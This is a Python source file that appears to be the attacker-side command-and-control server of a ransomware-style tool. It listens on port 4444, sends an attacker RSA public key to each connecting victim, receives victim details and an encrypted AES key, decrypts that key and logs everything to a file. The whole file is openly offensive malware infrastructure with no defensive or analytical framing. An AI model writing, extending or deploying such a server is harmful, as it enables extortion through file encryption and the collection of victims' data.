import socket
from datetime import datetime
import os
import base64

from decrypt_Aeskey import decrypt_aes_key  # Import decryption function

LOG_FILE = "logs.txt"
HOST = "192.168.1.187"
PORT = 4444

# Load attacker's RSA public key to send to victim
with open("attacker_public.pem", "rb") as f:
    rsa_public_key = f.read()

def start_server():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    server = socket.socket()
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"[*] Attacker server listening on {HOST}:{PORT}...")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")

        try:
            # Step 1: Send public key to victim
            client.send(rsa_public_key)

            # Step 2: Receive victim info + encrypted AES key
            data = client.recv(4096).decode()

            # Try to decrypt AES key
            decrypted_key_text = ""
            try:
                if "Encrypted AES Key:\n" in data:
                    encrypted_b64 = data.split("Encrypted AES Key:\n", 1)[1].strip()
                    aes_key = decrypt_aes_key(encrypted_b64)
                    if aes_key:
                        decrypted_key_text = f"[DECRYPTED AES KEY] {base64.b64encode(aes_key).decode()}"
            except Exception as decryption_error:
                decrypted_key_text = f"[!] AES Key decryption error: {decryption_error}"

            # Build log entry
            log_entry = f"\n=== Victim {addr} @ {datetime.now()} ===\n{data}\n{decrypted_key_text}\n"

            # Write to log
            with open(LOG_FILE, "a") as log:
                log.write(log_entry)

            print("[*] Victim data logged.")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            client.close()

if __name__ == "__main__":
    start_server()
